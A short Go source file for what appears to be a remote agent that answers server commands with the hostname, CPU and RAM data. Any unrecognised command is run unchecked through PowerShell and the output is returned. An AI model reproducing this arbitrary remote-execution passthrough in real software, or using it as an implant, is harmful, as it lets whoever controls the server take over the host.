package main

import (
	"os/exec"
	"strings"
)

type ResponseMessage struct {
	ClientID string         `json:"client_id"`
	Command  string         `json:"command"` // "get HN", "list VC"
	Data     map[string]any `json:"data,omitempty"`
	Error    string         `json:"error,omitempty"`
}

func handleCommand(msg CommandMessage) ResponseMessage {
	response := ResponseMessage{ClientID: msg.Target}
	switch msg.Command {
	case "gHN":
		response.Command = "gHN"
		hn, err := getHostname()
		if err != nil {
			response.Error = err.Error()
			return response
		}

		response.Data = map[string]any{"hostname": hn}
		return response
	case "gCPU":
		response.Command = "gCPU"
		ramModules, err := getCPUModules()
		if err != nil {
			response.Error = err.Error()
			return response
		}

		response.Data = formatCPUData(ramModules)
		return response
	case "gRAM":
		response.Command = "gRAM"
		ramModules, err := getRAMModules()
		if err != nil {
			response.Error = err.Error()
			return response
		}

		response.Data = formatRAMData(ramModules)
		return response

	default:
		// Выполнить как PS
		script := `[Console]::OutputEncoding = [Text.Encoding]::UTF8;` + msg.Command
		cmd := exec.Command("powershell", "/C", script)
		output, _ := cmd.CombinedOutput()
		return ResponseMessage{
			ClientID: msg.Target,
			Command:  "custom",
			Data: map[string]any{
				"output": strings.TrimSpace(string(output)),
			},
		}
	}
}
